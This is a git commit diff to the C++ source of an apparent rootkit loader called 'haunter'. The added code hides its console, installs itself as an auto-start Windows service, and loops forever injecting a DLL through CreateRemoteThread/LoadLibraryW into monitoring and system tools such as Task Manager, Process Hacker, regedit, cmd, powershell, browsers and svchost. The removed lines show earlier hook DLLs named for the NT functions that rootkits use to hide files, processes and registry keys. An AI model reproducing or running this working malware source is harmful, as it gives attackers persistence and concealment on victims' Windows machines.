9970b4c109b6806803b74052b7437b96378875b9
Kasparov <143829431+kasp4rov@users.noreply.github.com>
2024-02-04 16:43:35 -0300

    Update main.cpp

--- src/main/main.cpp
+++ src/main/main.cpp
@@ -6,8 +6,43 @@
 
 using namespace std;
 
-DWORD GetProcessIdByName(const wstring& processName) {
+void InstallService() {
+    wchar_t szPath[MAX_PATH];
+    if (GetModuleFileName(NULL, szPath, MAX_PATH) == 0) {
+        return;
+    }
 
+    wstring servicePath = wstring(szPath) + L" -service";
+    SC_HANDLE schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    if (schSCManager == NULL) {
+        return;
+    }
+
+    SC_HANDLE schService = CreateService(
+        schSCManager,                 
+        L"haunter",                 
+        L"haunter_srvs",      
+        SERVICE_ALL_ACCESS,            
+        SERVICE_WIN32_OWN_PROCESS,      
+        SERVICE_AUTO_START,             
+        SERVICE_ERROR_NORMAL,          
+        servicePath.c_str(),            
+        NULL,                         
+        NULL,                         
+        NULL,                          
+        NULL,                           
+        NULL);                         
+
+    if (schService == NULL) {
+        CloseServiceHandle(schSCManager);
+        return;
+    }
+
+    CloseServiceHandle(schService);
+    CloseServiceHandle(schSCManager);
+}
+
+DWORD GetProcessIdByName(const wstring& processName) {
     DWORD processId = 0;
     HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
@@ -23,21 +58,20 @@ DWORD GetProcessIdByName(const wstring& processName) {
     return processId;
 }
 
-
 int InjectDll(DWORD processId, const wstring& dllPath) {
     HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
     if (processHandle == NULL) {
         return -1;
     }
 
-    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW"); // permite que o executavel carregue a dll
+    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
     if (loadLibraryAddress == NULL) {
         CloseHandle(processHandle);
         return -2;
     }
 
-    size_t pathLength = (dllPath.size() + 1) * sizeof(wchar_t); // calcula o tamanho da dll
-    LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE); // aloca memoria no processo alvo
+    size_t pathLength = (dllPath.size() + 1) * sizeof(wchar_t);
+    LPVOID remoteDllPath = VirtualAllocEx(processHandle, NULL, pathLength, MEM_COMMIT, PAGE_READWRITE);
     if (remoteDllPath == NULL) {
         CloseHandle(processHandle);
         return -3;
@@ -49,7 +83,7 @@ int InjectDll(DWORD processId, const wstring& dllPath) {
         return -4;
     }
 
-    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL); // cria uma thread remota para executar LoadLibraryW
+    HANDLE threadHandle = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, remoteDllPath, 0, NULL);
     if (threadHandle == NULL) {
         VirtualFreeEx(processHandle, remoteDllPath, 0, MEM_RELEASE);
         CloseHandle(processHandle);
@@ -68,10 +102,9 @@ int InjectDll(DWORD processId, const wstring& dllPath) {
     return exitCode;
 }
 
-
 int main() {
-
     FreeConsole();
+    InstallService();
     wchar_t currentDir[MAX_PATH];
     GetModuleFileName(NULL, currentDir, MAX_PATH);
     wstring currentDirStr(currentDir);
@@ -81,15 +114,10 @@ int main() {
     }
     wstring exeDir = currentDirStr.substr(0, pos + 1);
 
-    wstring exeNames[] = { L"ProcessHacker.exe", L"explorer.exe", L"Taskmgr.exe", L"mmc.exe", L"powershell.exe", L"cmd.exe", L"msedge.exe", L"chrome.exe", L"regedit.exe"};
+    wstring exeNames[] = { L"ProcessHacker.exe", L"explorer.exe", L"Taskmgr.exe", L"mmc.exe", L"powershell.exe", L"cmd.exe", L"msedge.exe", L"chrome.exe", L"regedit.exe", L"svchost.exe"};
     const int numExes = sizeof(exeNames) / sizeof(wstring);
 
-    std::vector<std::wstring> dllNames = {
-        exeDir + L"NtEnumerateKey.dll",
-        exeDir + L"NTSystemInformation.dll",
-        exeDir + L"NtQueryDirectoryFile.dll"
-
-    };
+    wstring dllPath = exeDir + L"haunter_src.dll"; 
 
     while (true) {
         PROCESSENTRY32 processEntry = { sizeof(PROCESSENTRY32) };
@@ -105,12 +133,10 @@ int main() {
         }
 
         do {
-            for (const auto& dllName : dllNames) {
-                for (int i = 0; i < numExes; i++) {
-                    if (_wcsicmp(processEntry.szExeFile, exeNames[i].c_str()) == 0) {
-                        DWORD processId = processEntry.th32ProcessID;
-                        InjectDll(processId, dllName);
-                    }
+            for (int i = 0; i < numExes; i++) {
+                if (_wcsicmp(processEntry.szExeFile, exeNames[i].c_str()) == 0) {
+                    DWORD processId = processEntry.th32ProcessID;
+                    InjectDll(processId, dllPath);
                 }
             }
         } while (Process32Next(snapshot, &processEntry));
